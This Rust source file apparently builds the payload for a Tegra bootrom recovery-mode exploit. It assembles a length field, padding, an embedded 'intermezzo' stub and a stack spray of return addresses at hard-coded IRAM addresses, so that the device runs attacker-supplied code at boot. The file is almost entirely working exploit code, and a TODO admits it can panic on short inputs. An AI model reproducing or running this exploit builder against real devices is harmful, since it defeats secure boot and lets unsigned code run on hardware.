pub struct Payload {
    pub data: Box<[u8]>,
}

impl Payload {
    pub fn new(payload: &[u8]) -> Self {
        const INTERMEZZO: &[u8; 124] = include_bytes!("intermezzo/intermezzo.bin");
        const MAX_LENGTH: u32 = 0x30298;

        const PAYLOAD_START_ADDR: usize = 0x40010E40;
        const RCM_PAYLOAD_ADDR: usize = 0x40010000;

        let mut payload_builder: Vec<u8> = Vec::with_capacity(MAX_LENGTH as usize);
        // start with the max_len arg
        payload_builder.extend(MAX_LENGTH.to_le_bytes());
        // pad with data to get to the start of IRAM
        payload_builder.extend([b'\0'; 680 - MAX_LENGTH.to_le_bytes().len()]);
        // add the intermezzo bin
        payload_builder.extend(INTERMEZZO);

        const PADDING_SIZE_1: usize = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + INTERMEZZO.len());
        payload_builder.extend([b'\0'; PADDING_SIZE_1]);

        // fit a a part of the payload before the stack spray
        const STACK_SPRAY_START: usize = 0x40014E40;
        const STACK_SPRAY_END: usize = 0x40017000;
        const PADDING_SIZE_2: usize = STACK_SPRAY_START - PAYLOAD_START_ADDR;
        const REPEAT_COUNT: usize = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;
        // TODO: fix potential panic
        let split = payload.split_at(PADDING_SIZE_2);
        payload_builder.extend(split.0);
        // start stack spray
        for _ in 0..REPEAT_COUNT {
            payload_builder.extend((RCM_PAYLOAD_ADDR as u32).to_le_bytes())
        }
        payload_builder.extend(split.1);

        // finish padding to be a size of 0x1000
        let padding_size = 0x1000 - (payload_builder.len() % 0x1000);
        payload_builder.resize(payload_builder.len() + padding_size, b'\0');

        assert_eq!(payload_builder.len() % 0x1000, 0);

        let data = payload_builder.into_boxed_slice();
        assert!(data.len() <= MAX_LENGTH as usize);
        Self { data }
    }

    pub fn data(&self) -> &[u8] {
        &self.data
    }
}
